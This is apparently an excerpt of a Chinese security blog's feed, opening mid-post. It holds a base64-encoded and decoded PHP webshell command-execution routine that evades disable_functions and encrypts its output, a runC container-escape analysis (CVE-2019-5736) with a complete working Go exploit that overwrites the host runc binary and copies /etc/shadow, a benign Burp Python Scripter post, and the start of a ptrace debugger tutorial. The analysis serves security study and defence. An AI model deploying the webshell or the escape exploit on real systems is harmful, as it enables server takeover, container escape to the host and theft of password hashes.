YWR0Sm4gPSBhcnJheV9tYXAoJ3RyaW0nLCAkUGFkdEpuKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICAkUGFkdEpuID0gYXJyYXkoKTsNCiAgICB9DQogICAgJGMgPSAkY21kOw0KICAgIGlmIChGQUxTRSAhPT0gc3RycG9zKHN0cnRvbG93ZXIoUEhQX09TKSwgJ3dpbicpKSB7DQogICAgICAgICRjID0gJGMgLiAiIDI+JjFcbiI7DQogICAgfQ0KICAgICRKdWVRREJIID0gJ2lzX2NhbGxhYmxlJzsNCiAgICAkQnZjZSA9ICdpbl9hcnJheSc7DQogICAgaWYgKCRKdWVRREJIKCdzeXN0ZW0nKSBhbmQgISAkQnZjZSgnc3lzdGVtJywgJFBhZHRKbikpIHsNCiAgICAgICAgb2Jfc3RhcnQoKTsNCiAgICAgICAgc3lzdGVtKCRjKTsNCiAgICAgICAgJGtXSlcgPSBvYl9nZXRfY29udGVudHMoKTsNCiAgICAgICAgb2JfZW5kX2NsZWFuKCk7DQogICAgfSBlbHNlIGlmICgkSnVlUURCSCgncHJvY19vcGVuJykgYW5kICEgJEJ2Y2UoJ3Byb2Nfb3BlbicsICRQYWR0Sm4pKSB7DQogICAgICAgICRoYW5kbGUgPSBwcm9jX29wZW4oJGMsIGFycmF5KA0KICAgICAgICAgICAgYXJyYXkoDQogICAgICAgICAgICAgICAgJ3BpcGUnLA0KICAgICAgICAgICAgICAgICdyJw0KICAgICAgICAgICAgKSwNCiAgICAgICAgICAgIGFycmF5KA0KICAgICAgICAgICAgICAgICdwaXBlJywNCiAgICAgICAgICAgICAgICAndycNCiAgICAgICAgICAgICksDQogICAgICAgICAgICBhcnJheSgNCiAgICAgICAgICAgICAgICAncGlwZScsDQogICAgICAgICAgICAgICAgJ3cnDQogICAgICAgICAgICApDQogICAgICAgICksICRwaXBlcyk7DQogICAgICAgICRrV0pXID0gTlVMTDsNCiAgICAgICAgd2hpbGUgKCEgZmVvZigkcGlwZXNbMV0pKSB7DQogICAgICAgICAgICAka1dKVyAuPSBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KICAgICAgICB9DQogICAgICAgIEBwcm9jX2Nsb3NlKCRoYW5kbGUpOw0KICAgIH0gZWxzZSBpZiAoJEp1ZVFEQkgoJ3Bhc3N0aHJ1JykgYW5kICEgJEJ2Y2UoJ3Bhc3N0aHJ1JywgJFBhZHRKbikpIHsNCiAgICAgICAgb2Jfc3RhcnQoKTsNCiAgICAgICAgcGFzc3RocnUoJGMpOw0KICAgICAgICAka1dKVyA9IG9iX2dldF9jb250ZW50cygpOw0KICAgICAgICBvYl9lbmRfY2xlYW4oKTsNCiAgICB9IGVsc2UgaWYgKCRKdWVRREJIKCdzaGVsbF9leGVjJykgYW5kICEgJEJ2Y2UoJ3NoZWxsX2V4ZWMnLCAkUGFkdEpuKSkgew0KICAgICAgICAka1dKVyA9IHNoZWxsX2V4ZWMoJGMpOw0KICAgIH0gZWxzZSBpZiAoJEp1ZVFEQkgoJ2V4ZWMnKSBhbmQgISAkQnZjZSgnZXhlYycsICRQYWR0Sm4pKSB7DQogICAgICAgICRrV0pXID0gYXJyYXkoKTsNCiAgICAgICAgZXhlYygkYywgJGtXSlcpOw0KICAgICAgICAka1dKVyA9IGpvaW4oY2hyKDEwKSwgJGtXSlcpIC4gY2hyKDEwKTsNCiAgICB9IGVsc2UgaWYgKCRKdWVRREJIKCdleGVjJykgYW5kICEgJEJ2Y2UoJ3BvcGVuJywgJFBhZHRKbikpIHsNCiAgICAgICAgJGZwID0gcG9wZW4oJGMsICdyJyk7DQogICAgICAgICRrV0pXID0gTlVMTDsNCiAgICAgICAgaWYgKGlzX3Jlc291cmNlKCRmcCkpIHsNCiAgICAgICAgICAgIHdoaWxlICghIGZlb2YoJGZwKSkgew0KICAgICAgICAgICAgICAgICRrV0pXIC49IGZyZWFkKCRmcCwgMTAyNCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgQHBjbG9zZSgkZnApOw0KICAgIH0gZWxzZSB7DQogICAgICAgICRrV0pXID0gMDsNCiAgICAgICAgJHJlc3VsdFsic3RhdHVzIl0gPSBiYXNlNjRfZW5jb2RlKCJmYWlsIik7DQogICAgICAgICRyZXN1bHRbIm1zZyJdID0gYmFzZTY0X2VuY29kZSgibm9uZSBvZiBwcm9jX29wZW4vcGFzc3RocnUvc2hlbGxfZXhlYy9leGVjL2V4ZWMgaXMgYXZhaWxhYmxlIik7DQogICAgICAgICRrZXkgPSAkX1NFU1NJT05bJ2snXTsNCiAgICAgICAgZWNobyBlbmNyeXB0KGpzb25fZW5jb2RlKCRyZXN1bHQpLCAka2V5KTsNCiAgICAgICAgcmV0dXJuOw0KICAgICAgICANCiAgICB9DQogICAgJHJlc3VsdFsic3RhdHVzIl0gPSBiYXNlNjRfZW5jb2RlKCJzdWNjZXNzIik7DQogICAgJHJlc3VsdFsibXNnIl0gPSBiYXNlNjRfZW5jb2RlKGdldFNhZmVTdHIoJGtXSlcpKTsNCiAgICBlY2hvIGVuY3J5cHQoanNvbl9lbmNvZGUoJHJlc3VsdCksICAkX1NFU1NJT05bJ2snXSk7DQp9DQoNCmZ1bmN0aW9uIGVuY3J5cHQoJGRhdGEsJGtleSkNCnsNCglpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQ0KICAgIAl7DQogICAgCQlmb3IoJGk9MDskaTxzdHJsZW4oJGRhdGEpOyRpKyspIHsNCiAgICAJCQkgJGRhdGFbJGldID0gJGRhdGFbJGldXiRrZXlbJGkrMSYxNV07IA0KICAgIAkJCX0NCgkJCXJldHVybiAkZGF0YTsNCiAgICAJfQ0KICAgIGVsc2UNCiAgICAJew0KICAgIAkJcmV0dXJuIG9wZW5zc2xfZW5jcnlwdCgkZGF0YSwgIkFFUzEyOCIsICRrZXkpOw0KICAgIAl9DQp9JGNtZD0iWTJRZ0wyUWdJa1E2WEhCb2NITjBkV1I1WDNCeWIxeFhWMWRjSWlaM2FHOWhiV2s9IjskY21kPWJhc2U2NF9kZWNvZGUoJGNtZCk7JHBhdGg9IlJEb3ZjR2h3YzNSMVpIbGZjSEp2TDFkWFZ5OD0iOyRwYXRoPWJhc2U2NF9kZWNvZGUoJHBhdGgpOw0KbWFpbigkY21kLCRwYXRoKTs='));

将内容base64解密：
@error_reporting(0);

function getSafeStr($str){
    $s1 = iconv('utf-8','gbk//IGNORE',$str);
    $s0 = iconv('gbk','utf-8//IGNORE',$s1);
    if($s0 == $str){
        return $s0;
    }else{
        return iconv('gbk','utf-8//IGNORE',$str);
    }
}
function main($cmd,$path)
{
    @set_time_limit(0);
    @ignore_user_abort(1);
    @ini_set('max_execution_time', 0);
    $result = array();
    $PadtJn = @ini_get('disable_functions');
    if (! empty($PadtJn)) {
        $PadtJn = preg_replace('/[, ]+/', ',', $PadtJn);
        $PadtJn = explode(',', $PadtJn);
        $PadtJn = array_map('trim', $PadtJn);
    } else {
        $PadtJn = array();
    }
    $c = $cmd;
    if (FALSE !== strpos(strtolower(PHP_OS), 'win')) {
        $c = $c . " 2&gt;&amp;1\n";
    }
    $JueQDBH = 'is_callable';
    $Bvce = 'in_array';
    if ($JueQDBH('system') and ! $Bvce('system', $PadtJn)) {
        ob_start();
        system($c);
        $kWJW = ob_get_contents();
        ob_end_clean();
    } else if ($JueQDBH('proc_open') and ! $Bvce('proc_open', $PadtJn)) {
        $handle = proc_open($c, array(
            array(
                'pipe',
                'r'
            ),
            array(
                'pipe',
                'w'
            ),
            array(
                'pipe',
                'w'
            )
        ), $pipes);
        $kWJW = NULL;
        while (! feof($pipes[1])) {
            $kWJW .= fread($pipes[1], 1024);
        }
        @proc_close($handle);
    } else if ($JueQDBH('passthru') and ! $Bvce('passthru', $PadtJn)) {
        ob_start();
        passthru($c);
        $kWJW = ob_get_contents();
        ob_end_clean();
    } else if ($JueQDBH('shell_exec') and ! $Bvce('shell_exec', $PadtJn)) {
        $kWJW = shell_exec($c);
    } else if ($JueQDBH('exec') and ! $Bvce('exec', $PadtJn)) {
        $kWJW = array();
        exec($c, $kWJW);
        $kWJW = join(chr(10), $kWJW) . chr(10);
    } else if ($JueQDBH('exec') and ! $Bvce('popen', $PadtJn)) {
        $fp = popen($c, 'r');
        $kWJW = NULL;
        if (is_resource($fp)) {
            while (! feof($fp)) {
                $kWJW .= fread($fp, 1024);
            }
        }
        @pclose($fp);
    } else {
        $kWJW = 0;
        $result["status"] = base64_encode("fail");
        $result["msg"] = base64_encode("none of proc_open/passthru/shell_exec/exec/exec is available");
        $key = $_SESSION['k'];
        echo encrypt(json_encode($result), $key);
        return;
        
    }
    $result["status"] = base64_encode("success");
    $result["msg"] = base64_encode(getSafeStr($kWJW));
    echo encrypt(json_encode($result),  $_SESSION['k']);
}

function encrypt($data,$key)
{
    if(!extension_loaded('openssl'))
        {
            for($i=0;$i&lt;strlen($data);$i++) {
                 $data[$i] = $data[$i]^$key[$i+1&amp;15]; 
                }
            return $data;
        }
    else
        {
            return openssl_encrypt($data, "AES128", $key);
        }
}$cmd="Y2QgL2QgIkQ6XHBocHN0dWR5X3Byb1xXV1dcIiZ3aG9hbWk=";$cmd=base64_decode($cmd);$path="RDovcGhwc3R1ZHlfcHJvL1dXVy8=";$path=base64_decode($path);
main($cmd,$path);

而cmd内容即为执行内容：
cd /d "D:\phpstudy_pro\WWW\"&amp;whoami

小小总结这些webshell被大家所使用不仅仅是在当时出现时可绕过大部分流量检测，独特的请求方式，和免杀，还有他们与时俱进的各种功能，内网穿透、内存马等等，实现一键去日内网，随着检测手段加强和内网利用手段的增多，相信也会有新的绕过方法和功能出现。
参考链接：https://www.freebuf.com/sectool/285693.html
https://xz.aliyun.com/t/10556
http://www.wjhsh.net/0daybug-p-12004574.html

]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title>容器进程切换漏洞</title>
    <url>//post/%E5%AE%B9%E5%99%A8%E8%BF%9B%E7%A8%8B%E5%88%87%E6%8D%A2%E6%BC%8F%E6%B4%9E.html</url>
    <content><![CDATA[容器进程切换思考前置技术Magic Link​        /proc/目录下存在很多的链接文件，但是在Linux 也存在一种特殊的链接文件，这种文件的大小为0，我们知道普通的链接文件的大小等于链接目标的文件路径长度，但是Magic Link的大小为0，它们在打开方式上面也存在差别，普通链接文件会解析出链接文件的路径然后进行打开操作，但是Magic LInk的话不会这样，它会调用内核专门的处理函数，然后返回目标文件的文件描述符。

匿名文件​        Linux Anonymous Files，也叫匿名文件，匿名文件和普通的文件十分类似，可以被定义，修改，写入，读取等等，但是和普通文件不同的是它并不是一个实体的文件，当用户使用memfd_create创建一个匿名文件的时候会返回一个文件描述符，一旦对这个文件描述符的所有引用都被丢弃的时候，该匿名文件就会被销毁，而且在该文件的整个生命周期中都是存在于内存的RAM当中，并不具备实体的文件。
mount namespace是如何实现的？​        首先要了解在内核进程结构体task_struct里面存在一个nsproxy成员：
    struct task_struct {
    .........
    /* Namespaces: */
    struct nsproxy            *nsproxy;
    .......
    }

nsproxy结构体如下：
struct nsproxy {
    atomic_t count;
    struct uts_namespace *uts_ns;
    struct ipc_namespace *ipc_ns;
    struct mnt_namespace *mnt_ns;
    struct pid_namespace *pid_ns_for_children;
    struct net          *net_ns;
    struct time_namespace *time_ns;
    struct time_namespace *time_ns_for_children;
    struct cgroup_namespace *cgroup_ns;
};

可以看到各种不同的namespace都有自己的相关结构体，但是本文着重介绍mount namespace相关实现，因此通过追踪内核中进程的创建过程发现mount namespace的实现如下：
内核函数调用链：
kernel_clone(_do_fork) -&gt; copy_process

在copy_process中发现大量和namespace相关的信息：
static __latent_entropy struct task_struct *copy_process(
                    struct pid *pid,
                    int trace,
                    int node,
                    struct kernel_clone_args *args)
{
    int pidfd = -1, retval;
    struct task_struct *p;
    struct multiprocess_signals delayed;
    struct file *pidfile = NULL;
    u64 clone_flags = args-&gt;flags;
    struct nsproxy *nsp = current-&gt;nsproxy;

    /*
     * Don't allow sharing the root directory with processes in a different
     * namespace
     */
    if ((clone_flags &amp; (CLONE_NEWNS|CLONE_FS)) == (CLONE_NEWNS|CLONE_FS))
        return ERR_PTR(-EINVAL);

    if ((clone_flags &amp; (CLONE_NEWUSER|CLONE_FS)) == (CLONE_NEWUSER|CLONE_FS))
        return ERR_PTR(-EINVAL);
......
}

可以看到其实进程间的namespace可能具备某种继承关系，因此自然联想到系统0号进程，查阅相关资料发现存在init_task，它在内核刚启动的时候就进行了初始化，而且在相关结构体里面也确实找到了对于nsproxy的初始化：
......
    .nsproxy    = &amp;init_nsproxy,
......

init_nsproxy的相关定义如下：
struct nsproxy init_nsproxy = {
    .count            = ATOMIC_INIT(1),
    .uts_ns            = &amp;init_uts_ns,
#if defined(CONFIG_POSIX_MQUEUE) || defined(CONFIG_SYSVIPC)
    .ipc_ns            = &amp;init_ipc_ns,
#endif
    .mnt_ns            = NULL,
    .pid_ns_for_children    = &amp;init_pid_ns,
#ifdef CONFIG_NET
    .net_ns            = &amp;init_net,
#endif
#ifdef CONFIG_CGROUPS
    .cgroup_ns        = &amp;init_cgroup_ns,
#endif
#ifdef CONFIG_TIME_NS
    .time_ns        = &amp;init_time_ns,
    .time_ns_for_children    = &amp;init_time_ns,
#endif
};

可以发现，mnt_ns的相关初始化函数是NULL，因此mnt_ns并不继承父进程命名空间，回过头来看之前的copy_namespaces函数，发现其中存在create_new_namespaces函数调用，在其中发现mnt_namespace确实是通过copy_mnt_ns函数新创建的，至此我们已经大致了解了整个mnt_namespace的实现和创建流程。同时，通过copy_mnt_ns函数大致了解到，其实就是提供了独立的文件系统视图，设置各种挂载点，因此只要帮助绕过视图的影响就可以绕过mount namespace，所以符号链接攻击一直也是容器的痛点问题之一。
runC nsenter模块​        在查看runC源码的时候发现nsenter模块，改模块的主要实现使用C语言写的，而且只在init.go的import中被引入，因此它的执行顺序是很靠前的。
package nsenter

/*
#cgo CFLAGS: -Wall
extern void nsexec();
void __attribute__((constructor)) init(void) {
    nsexec();
}
*/
import "C"

在import “C”前面紧跟注释是cgo的一种特殊语法，注释里面包含的都是c语言的语法
漏洞分析​        在容器中执行docker run或者docker exec的时候，最终结果都是runC驱动执行用户想要执行的命令。同时，分析runC源码发现，无论是runC run还是runC exec，一个比较核心的思想就是创建一个runner结构体，然后调用其实现的run()函数：
func execProcess(context *cli.Context) (int, error) {
    container, err := getContainer(context)
    if err != nil {
        return -1, err
    }
    status, err := container.Status()
    if err != nil {
        return -1, err
    }
    if status == libcontainer.Stopped {
        return -1, errors.New("cannot exec in a stopped container")
    }
    if status == libcontainer.Paused &amp;&amp; !context.Bool("ignore-paused") {
        return -1, errors.New("cannot exec in a paused container (use --ignore-paused to override)")
    }
    path := context.String("process")
    if path == "" &amp;&amp; len(context.Args()) == 1 {
        return -1, errors.New("process args cannot be empty")
    }
    state, err := container.State()
    if err != nil {
        return -1, err
    }
    bundle := utils.SearchLabels(state.Config.Labels, "bundle")
    p, err := getProcess(context, bundle)
    if err != nil {
        return -1, err
    }

    cgPaths, err := getSubCgroupPaths(context.StringSlice("cgroup"))
    if err != nil {
        return -1, err
    }

    r := &amp;runner{
        enableSubreaper: false,
        shouldDestroy:   false,
        container:       container,
        consoleSocket:   context.String("console-socket"),
        detach:          context.Bool("detach"),
        pidFile:         context.String("pid-file"),
        action:          CT_ACT_RUN,
        init:            false,
        preserveFDs:     context.Int("preserve-fds"),
        subCgroupPaths:  cgPaths,
    }
    return r.run(p)
}

不过在此之前都会通过loadFactory类来创建基础的libcontainer以便和容器进行交互，在exec.go中，getContainer的一个重要功能就是创建libccontainer实例：
// loadFactory returns the configured factory instance for execing containers.
func loadFactory(context *cli.Context) (libcontainer.Factory, error) {
    root := context.GlobalString("root")
    abs, err := filepath.Abs(root)
    if err != nil {
        return nil, err
    }

    intelRdtManager := libcontainer.IntelRdtFs

    // We resolve the paths for {newuidmap,newgidmap} from the context of runc,
    // to avoid doing a path lookup in the nsexec context. TODO: The binary
    // names are not currently configurable.
    newuidmap, err := exec.LookPath("newuidmap")
    if err != nil {
        newuidmap = ""
    }
    newgidmap, err := exec.LookPath("newgidmap")
    if err != nil {
        newgidmap = ""
    }

    return libcontainer.New(abs, intelRdtManager,
        libcontainer.CriuPath(context.GlobalString("criu")),
        libcontainer.NewuidmapPath(newuidmap),
        libcontainer.NewgidmapPath(newgidmap))
}

在结尾的New函数中，可以看到runC存储了一个MagicLink作为InitPath:
// New returns a linux based container factory based in the root directory and
// configures the factory with the provided option funcs.
func New(root string, options ...func(*LinuxFactory) error) (Factory, error) {
    if root != "" {
        if err := os.MkdirAll(root, 0o700); err != nil {
            return nil, err
        }
    }
    l := &amp;LinuxFactory{
        Root:      root,
        InitPath:  "/proc/self/exe",
        InitArgs:  []string{os.Args[0], "init"},
        Validator: validate.New(),
        CriuPath:  "criu",
    }

    for _, opt := range options {
        if opt == nil {
            continue
        }
        if err := opt(l); err != nil {
            return nil, err
        }
    }
    return l, nil
}

在接下来的过程中会调用该InitPath，并且参数为init，相当于执行了runC init命令，在该命令中采用cgo的形式导入C语言nstnter进行命名空间的设置：
package main

import (
    "os"
    "runtime"
    "strconv"

    "github.com/opencontainers/runc/libcontainer"
    _ "github.com/opencontainers/runc/libcontainer/nsenter"
    "github.com/sirupsen/logrus"
)
......

nsenter如下：
package nsenter

/*
#cgo CFLAGS: -Wall
extern void nsexec();
void __attribute__((constructor)) init(void) {
    nsexec();
}
*/
import "C"

可以看到调用了nsexec()函数，该函数在go runtime之前进行调用，函数的主要作用就是解析之前父进程发送的netlink格式的配置信息，然后通过设置usernamespace并创建子进程，然后子进程设置其他一些namespace并通过创建孙进程使相关namespaces生效，这个孙进程其实就是容器中的init进程，不过回想这个过程，runC通过cmd.Start()开启一个子进程执行runC init，在runC init的nsenter包执行过程中，会首先设置自己的user namespace和pid namespace，这就使得在该过程中容器内本身存在的进程可以发现runC进程，因此：
void nsexec(void)
{
    int pipenum;
    jmp_buf env;
    int syncpipe[2];
    struct nlconfig_t config = {0};

    /*
     * If we don't have an init pipe, just return to the go routine.
     * We'll only get an init pipe for start or exec.
     */
    pipenum = initpipe();
    if (pipenum == -1)
        return;

    /* Parse all of the netlink configuration. */
    nl_parse(pipenum, &amp;config);

    /* clone(2) flags are mandatory. */
    if (config.cloneflags == -1)
        bail("missing clone_flags");

    /* Pipe so we can tell the child when we've finished setting up. */
    if (pipe(syncpipe) &lt; 0)
        bail("failed to setup sync pipe between parent and child");

    /* Set up the jump point. */
    if (setjmp(env) == JUMP_VAL) {
        /*
         * We're inside the child now, having jumped from the
         * start_child() code after forking in the parent.
         */
        uint8_t s = 0;
        int consolefd = config.consolefd;

        /* Close the writing side of pipe. */
        close(syncpipe[1]);

        /* Sync with parent. */
        if (read(syncpipe[0], &amp;s, sizeof(s)) != sizeof(s) || s != SYNC_VAL)
            bail("failed to read sync byte from parent");

        if (setsid() &lt; 0)
            bail("setsid failed");

        if (setuid(0) &lt; 0)
            bail("setuid failed");

        if (setgid(0) &lt; 0)
            bail("setgid failed");

        if (setgroups(0, NULL) &lt; 0)
            bail("setgroups failed");

        if (consolefd != -1) {
            if (ioctl(consolefd, TIOCSCTTY, 0) &lt; 0)
                bail("ioctl TIOCSCTTY failed");
            if (dup3(consolefd, STDIN_FILENO, 0) != STDIN_FILENO)
                bail("failed to dup stdin");
            if (dup3(consolefd, STDOUT_FILENO, 0) != STDOUT_FILENO)
                bail("failed to dup stdout");
            if (dup3(consolefd, STDERR_FILENO, 0) != STDERR_FILENO)
                bail("failed to dup stderr");
        }

        /* Free netlink data. */
        nl_free(&amp;config);

        /* Finish executing, let the Go runtime take over. */
        return;
    }

    /* Run the parent code. */
    start_child(pipenum, &amp;env, syncpipe, &amp;config);

    /* Should never be reached. */
    bail("should never be reached");
}

​        如果，在runc启动之前，容器内部的进程可以通过/proc/目录观察到runc相关的进程，那么就可以通过/proc/runc-pid/exe获得runc具体的路径，这个exe文件是Magic Link文件，这就意味着这个文件的打开过程是调用内核里面专门的处理函数，不是想普通的链接文件那样找到目标链接文件打开，这其实就帮助我们绕过了mnt命名空间和chroot对容器中文件系统资源的限制。
​        如此我们就可以覆盖掉原本的runc二进制文件为我们的恶意代码，那么当用于下一次执行docker exec或者docker run之类需要调用runc的命令的时候就有可能会调用我们写入的恶意文件从而实现宿主机上面的恶意代码执行从而实现容器逃逸。
pocpackage main

// Implementation of CVE-2019-5736
// Created with help from @singe, @_cablethief, and @feexd.
// This commit also helped a ton to understand the vuln
// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d
import (
        "fmt"
        "io/ioutil"
        "os"
        "strconv"
        "strings"
)

// This is the line of shell commands that will execute on the host
var payload = "#!/bin/bash \n cat /etc/shadow &gt; /tmp/shadow &amp;&amp; chmod 777 /tmp/shadow"

func main() {
        // First we overwrite /bin/sh with the /proc/self/exe interpreter path
        fd, err := os.Create("/bin/sh")
        if err != nil {
                fmt.Println(err)
                return
        }
        fmt.Fprintln(fd, "#!/proc/self/exe")
        err = fd.Close()
        if err != nil {
                fmt.Println(err)
                return
        }
        fmt.Println("[+] Overwritten /bin/sh successfully")

        // Loop through all processes to find one whose cmdline includes runcinit
        // This will be the process created by runc
        var found int
        for found == 0 {
                pids, err := ioutil.ReadDir("/proc")
                if err != nil {
                        fmt.Println(err)
                        return
                }
                for _, f := range pids {
                        fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
                        fstring := string(fbytes)
                        if strings.Contains(fstring, "runc") {
                                fmt.Println("[+] Found the PID:", f.Name())
                                found, err = strconv.Atoi(f.Name())
                                if err != nil {
                                        fmt.Println(err)
                                        return
                                }
                        }
                }
        }

        // We will use the pid to get a file handle for runc on the host.
        var handleFd = -1
        for handleFd == -1 {
                // Note, you do not need to use the O_PATH flag for the exploit to work.
                handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)
                if int(handle.Fd()) &gt; 0 {
                        handleFd = int(handle.Fd())
                }
        }
        fmt.Println("[+] Successfully got the file handle")

        // Now that we have the file handle, lets write to the runc binary and overwrite it
        // It will maintain it's executable flag
        for {
                writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
                if int(writeHandle.Fd()) &gt; 0 {
                        fmt.Println("[+] Successfully got write handle", writeHandle)
                        writeHandle.Write([]byte(payload))
                        return
                }
        }
}

POC思路：

首先覆盖容器中的/bin/sh为#!/proc/self/exe。
遍历/proc下的目录找到runC相关进程
打开/proc下相关的exe文件获得fd
循环写入 fd，直到runC解除占用，成功写入
runc最后将执行用户通过docker exec指定的/bin/sh，它的内容在第1步中已经被替换成#!/proc/self/exe，因此实际上将执行宿主机上的runc，而runc也已经在第4部中被我们覆盖掉了。

漏洞补丁具体补丁详情：https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d
void nsexec(void)
{
    int pipenum;
    @@ -549,6 +552,14 @@ void nsexec(void)
    if (pipenum == -1)
        return;

    /*
     * We need to re-exec if we are not in a cloned binary. This is necessary
     * to ensure that containers won't be able to access the host binary
     * through /proc/self/exe. See CVE-2019-5736.
     */
    if (ensure_cloned_binary() &lt; 0)
        bail("could not ensure we are a cloned binary");

    /* Parse all of the netlink configuration. */
    nl_parse(pipenum, &amp;config);

​        可以看到主要是增加了一个ensure_cloned_binary()函数的判断其中主要的逻辑是通过memfd_create来将让runc在容器内执行操作前首先将自己复制成为一个匿名文件，如此在可以达到原来效果的同时，/proc/self/exe无法触达到原本的runC二进制文件。
思考​        为了对容器进行有效控制通过宿主机进行容器内外的进程切换其实是必然的，但是稍有不慎就会导致容器信息外带在进程的上下文中，runC的这个漏洞是一个例子还有一个例子就是docker cp漏洞，它本身也是因为docker-tar进程将相关的共享库内容外带到了宿主机导致了容器逃逸，因此在考虑容器安全问题时，对这些危险进程的监控也是十分必要的。
]]></content>
      <categories>
        <category>容器安全</category>
      </categories>
      <tags>
        <tag>容器安全</tag>
      </tags>
  </entry>
  <entry>
    <title>灵活的修改Burp请求</title>
    <url>//post/%E7%81%B5%E6%B4%BB%E7%9A%84%E4%BF%AE%E6%94%B9Burp%E8%AF%B7%E6%B1%82.html</url>
    <content><![CDATA[灵活的修改Burp请求  在日常渗透测试中经常会遇到请求头需要替换、请求或响应内容需要解密等一系列麻烦的事。更换请求头可以通过Burp的Match and Replace功能来实现，加解密也有一些插件可以实现，但是它们普遍存在着以下缺陷：

自定义数据不能进行保存

加解密不能灵活的指定位置


  带着这些需求，笔者在寻找工具时发现了一款有趣的插件Python Scripter: https://github.com/PortSwigger/python-scripter 
简介  与其说这是一个插件，不如说其更像是一个框架。简单地说，它的功能是将当前请求上下文作为全局变量传入用户自定义的代码中，也就是说用户可以随意的修改请求信息。它本身的代码也是很简单的
  
  首先是将请求信息传递给用户自定义脚本的集合中，然后每个脚本分别对请求信息进行处理
  
  这里的处理其实就是用户编译代码通过后，把操作Burp的接口作为全局变量传递进去并执行
  
  这就实现了以插件“写”插件。
  
完善  上文的框架让我们有了灵活操纵请求的希望，而https://github.com/lanmaster53/pyscripter-er/blob/master/pyscripterer.py 则成功的将其变为了现实。其定义了一个接受messageInfo等请求信息的Class，并且提供了许多写好的方法以便于更新请求信息，例如删除一个请求头，可以这么写：
  
  这样任何请求都将不存在Sec-Ch-Ua-Mobile这个字段，remove_request_headers就是pyscripter-er中定义好的一个方法，主要作用就是遍历移除指定header_name开头的haeder字段并重新构造请求包
  
  如果要增加新的通用函数只需要在pyscripterer中进行修改即可，比如增加一个添加请求头的方法
  
实战  接下来用实战来检验下，在测试某个网站时碰到了如下加密请求
  
  通过分析JS发现其加密算法是base64加上一定的换位：
  
  那我们的思路就是每次请求时找到jsonparams这个参数，并对其进行加密，这样在发送请求时我们看到的参数就是未加密的了，方便我们在repeater进行测试。首先创建一个函数用于获取参数，根据参数名遍历即可
  
  删除找到的参数，之后重新创建一个新的参数，其值为加密后的值
  
  加密函数
  
  结合起来调用
  
  当我们发送请求
jsonparams={"UserId":"1234"}

  可以从logger中观测到其发生了变化，在intruder中的请求也会发生变化，再碰到需要爆破的场景时也是很实用的。
  
  除了对请求处理之外，我们也可以对响应做处理，而且操作结果会直接在当前页面里显现出来，不会像请求一样需要在日志里查看其修改结果，可以很好的解决响应内容加密的问题。还拿上面的请求为例，其响应内容是未加密的，这里给它做一次加密，简单的对相应内容做一次替换：
  
  使用base64进行加密
  
  最终的结果如下
  
总结  使用python-scripter可以灵活的写出适用于不同场景下的插件，同时可以将其保存为模板，方便之后遇到相似情况下的使用。本次虽然遇到的加密算法比较简单，但是以python执行jS的便捷，相信再复杂些的算法也能很快的实现。
  本文中修改过后的pyscripterer已上传至github: https://github.com/No4l/python-scripter/blob/main/pyscripterer.py
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>BurpSuite</tag>
      </tags>
  </entry>
  <entry>
    <title>实现一个简单的调试器</title>
    <url>//post/%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E8%B0%83%E8%AF%95%E5%99%A8.html</url>
    <content><![CDATA[实现一个简单的调试器​    以经典的GDB为例其项目代码共有十几万行代码，但是很多情况下只会使用到几个常用功能：单步，断点，查看变量，线程/进程切换。而GDB基本上是依赖于ptrace系统调用，主要用于编写调试程序。大部分实现思路参考Writing a Linux Debugger Part 2: Breakpoints (tartanllama.xyz)系列文章，强烈推荐阅读
目标功能：

单步
断点
查看内存/寄存器
查看汇编

ptrace 原理​    先来看看ptrace系统调用的函数签名：
#include &lt;sys/ptrace.h&gt;

long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);
/*DESCRIPTION
       The  ptrace()  system  call  provides  a  means  by  which one process (the
       "tracer") may observe and control the execution  of  another  process  (the
       "tracee"), and examine and change the tracee's memory and registers.  It is
       primarily used to implement breakpoint debugging and system call tracing.
       即ptrace系统调用提供给tracer控制，读取，修改另一个进程(tracee)的能力，由此可以实现断点和系统调用追踪
       
       A tracee first needs to be attached to the tracer.  Attachment  and  subse‐
       quent commands are per thread: in a multithreaded process, every thread can
       be individually attached to a (potentially different) tracer, or  left  not
       attached  and  thus  not debugged.  Therefore, "tracee" always means "(one)
       thread", never "a (possibly multithreaded) process".  Ptrace  commands  are
       always sent to a specific tracee using a call of the form
       即tracer通过ptrace进行附加(attach)和发送命令都是针对某一个线程的而不是进程
*/


request：调试者(tracer)要执行的操作，常见的有PTRACE_TRACEME，PTRACE_ATTACH，PTRACE_PEEKUSER，PTRACE_SINGLESTEP等
pid：被调试进程(tracee)pid
addr：要读写的内存地址
data：如果要向目标进程写入数据那么data就是我们数据地址；如果要读取目标进程数据那么data就是保留数据的地址

ptrace系统调用会根据不同的request完成不同功能如：

PTRACE_TRACEME：表示此进程即将被父进程trace，此时其他参数被忽略
PTRACE_PEEKTEXT, PTRACE_PEEKDATA：读取tracee在addr(虚拟内存空间)处的一个字，返回值就是读取到的字
PTRACE_PEEKUSER：读取tracee的USER area，其包含了该进程的寄存器以及其他信息
PTRACE_POKETEXT, PTRACE_POKEDATA：复制data所指向的一个字到tracee的addr(虚拟内存空间)处
PTRACE_POKEUSER：复制data所指的一个字带tracee的USER area
PTRACE_GETREGS, PTRACE_GETFPREGS：复制tracee的通用寄存器或者浮点寄存器到tracer的data所指的位置，addr被忽略
PTRACE_SETREGS, PTRACE_SETFPREGS：修改tracee的通用寄存器或者浮点寄存器
PTRACE_CONT：运行被暂停的tracee进程。如果data参数非0那么就表示data是传给tracee的信号数值
